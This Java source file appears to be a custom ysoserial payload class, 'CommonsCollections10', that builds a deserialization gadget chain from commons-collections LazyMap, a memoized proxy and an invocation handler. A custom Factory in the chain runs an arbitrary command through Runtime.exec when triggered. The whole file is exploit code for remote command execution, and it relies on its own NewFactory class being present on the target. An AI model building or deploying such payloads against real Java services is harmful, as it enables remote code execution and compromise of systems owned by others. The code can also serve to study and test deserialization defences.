package ysoserial.payloads;

import org.apache.commons.collections.Factory;
import org.apache.commons.collections.map.LazyMap;
import org.junit.jupiter.api.Test;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollections10 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
    //    成功
    @Override
    public InvocationHandler getObject(String command) throws Exception {
        final String[] execArgs = new String[]{command};
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, new NewFactory(execArgs));

        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

        return handler;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections10.class, args);
    }


    public class NewFactory implements Factory, Serializable {
        private final String[] execArgs;

        public NewFactory(String[] execArgs) {
            this.execArgs = execArgs;
        }

        @Override
        public Object create() {

            //exp
            System.out.println(execArgs);
//            System.out.println("123123");
            try {
                Runtime.getRuntime().exec(execArgs);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            return null;
        }
    }
}
